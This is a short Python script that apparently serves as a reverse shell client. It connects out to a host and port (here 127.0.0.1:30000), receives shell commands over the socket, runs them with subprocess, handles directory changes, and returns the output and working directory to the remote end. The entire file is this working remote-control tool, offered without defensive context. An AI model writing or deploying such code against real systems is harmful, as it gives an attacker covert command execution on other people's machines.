import socket
import os
import subprocess
import sys

HOST = "127.0.0.1"
PORT = 30000
BUFF = 1024 * 512

s = socket.socket()
s.connect((HOST, PORT))


while True:
    command = s.recv(BUFF).decode()
    split_command = command.split()
    if command.lower() == "exit":
        break
    output = ""
    if split_command[0] == "cd":
        try:
            os.chdir(" ".join(split_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    msg = f"{output}\n{cwd}"
    s.send(msg.encode())
s.close()
